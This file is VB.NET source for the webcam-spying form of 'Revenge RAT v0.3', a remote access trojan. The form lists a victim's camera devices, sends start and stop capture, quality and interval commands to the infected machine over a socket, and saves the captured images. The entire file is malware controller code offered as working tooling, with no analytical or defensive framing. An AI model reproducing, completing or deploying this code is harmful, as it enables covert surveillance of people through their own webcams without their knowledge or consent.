Imports Microsoft.VisualBasic.CompilerServices
Imports Revenge_RAT_v0._3.RevengeRAT

Public Class Remote_WebCam
    Public ASC As Integer
    Public FolderSavePic As String
    Public RWT As String
    Public Sock As Integer
    Public Sub New()
        Me.ASC = 0
        Me.InitializeComponent()
    End Sub

    Private Sub AutoSave_CheckedChanged(sender As Object, e As EventArgs) Handles AutoSave.CheckedChanged
        If Me.AutoSave.Checked Then
            Process.Start(Me.FolderSavePic)
        End If
    End Sub

    Private Sub NumericUpDown1_ValueChanged(sender As Object, e As EventArgs) Handles NumericUpDown1.ValueChanged
        My.Forms.Main.s.Send(Me.Sock, ("IN" & My.Forms.Main.Key & Me.NumericUpDown1.Value.ToString))
    End Sub

    Private Sub Q_Scroll(sender As Object, e As EventArgs) Handles Q.Scroll
        My.Forms.Main.s.Send(Me.Sock, ("QValue" & My.Forms.Main.Key & Conversions.ToString(Me.Q.Value)))
        Me.Label6.Text = ("Quality : " & Me.Q.Value.ToString & "%")
    End Sub

    Private Sub Refresh_Click(sender As Object, e As EventArgs) Handles Refresh.Click
        Me.Devices.Items.Clear()
        Me.Devices.Enabled = False
        Me.Start.Enabled = False
        Me.AutoSave.Enabled = False
        Me.Refresh.Enabled = False
        My.Forms.Main.s.Send(Me.Sock, "Devices")
    End Sub

    Private Sub Remote_WebCam_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        If (Me.Start.Text = "Stop Capture") Then
            My.Forms.Main.s.Send(Me.Sock, "Exit")
        End If
    End Sub

    Private Sub Remote_WebCam_Load(sender As Object, e As EventArgs) Handles Me.Load
        My.Forms.Main.s.Send(Me.Sock, "Devices")
        Me.Devices.GridLines = My.Forms.Main.ListView1.GridLines
        If My.Forms.Main.RWC Then
            Me.Q.Value = Conversions.ToInteger(SocketServer.GetIndex(My.Forms.Main.RWV))
            Me.Start.Text = "Stop Capture"
            Me.Start.Image = My.Resources.PU
            Me.Label6.Text = ("Quality : " & Conversions.ToString(Me.Q.Value) & "%")
            My.Forms.Main.s.Send(Me.Sock, ("QValue" & My.Forms.Main.Key & Conversions.ToString(Me.Q.Value)))
            My.Forms.Main.s.Send(Me.Sock, ("IN" & My.Forms.Main.Key & Me.NumericUpDown1.Value.ToString))
            My.Forms.Main.s.Send(Me.Sock, ("Start" & My.Forms.Main.Key & Conversions.ToString(0)))
            Me.TableLayoutPanel3.Visible = False
            Me.ASC = 1
            Me.AutoSave.Enabled = True
            Me.TableLayoutPanel1.Enabled = False
        End If
    End Sub

    Private Sub SP_CheckedChanged(sender As Object, e As EventArgs) Handles SP.CheckedChanged
        If Me.SP.Checked Then
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
        Else
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.Normal
        End If
    End Sub

    Private Sub Start_Click(sender As Object, e As EventArgs) Handles Start.Click
        If (Me.ASC = 1) Then
            Me.Start.Text = "Start Capture"
            My.Forms.Main.s.Send(Me.Sock, "Stop")
            Me.Start.Image = My.Resources.P
            Me.AutoSave.Enabled = False
            Me.TableLayoutPanel1.Enabled = True
            Me.TableLayoutPanel1.Enabled = True
            Me.SocketServer1.Value = 0
            Me.ASC = 0
            Me.TableLayoutPanel3.Visible = True
        ElseIf (Me.Start.Text = "Start Capture") Then
            If (Me.Devices.SelectedItems.Count = 0) Then
                Me.Devices.Items.Item(0).Selected = True
            End If
            Me.Start.Text = "Stop Capture"
            Me.TableLayoutPanel3.Visible = False
            Me.Start.Image = My.Resources.PU
            My.Forms.Main.s.Send(Me.Sock, ("QValue" & My.Forms.Main.Key & Conversions.ToString(Me.Q.Value)))
            My.Forms.Main.s.Send(Me.Sock, ("IN" & My.Forms.Main.Key & Me.NumericUpDown1.Value.ToString))
            My.Forms.Main.s.Send(Me.Sock, ("Start" & My.Forms.Main.Key & Conversions.ToString(Me.Devices.SelectedItems.Item(0).Index)))
            Me.AutoSave.Enabled = True
            Me.TableLayoutPanel1.Enabled = False
        Else
            Me.Start.Text = "Start Capture"
            My.Forms.Main.s.Send(Me.Sock, "Stop")
            Me.TableLayoutPanel3.Visible = True
            Me.Start.Image = My.Resources.P
            Me.AutoSave.Enabled = False
            Me.TableLayoutPanel1.Enabled = True
            Me.TableLayoutPanel1.Enabled = True
            Me.SocketServer1.Value = 0
        End If
    End Sub
End Class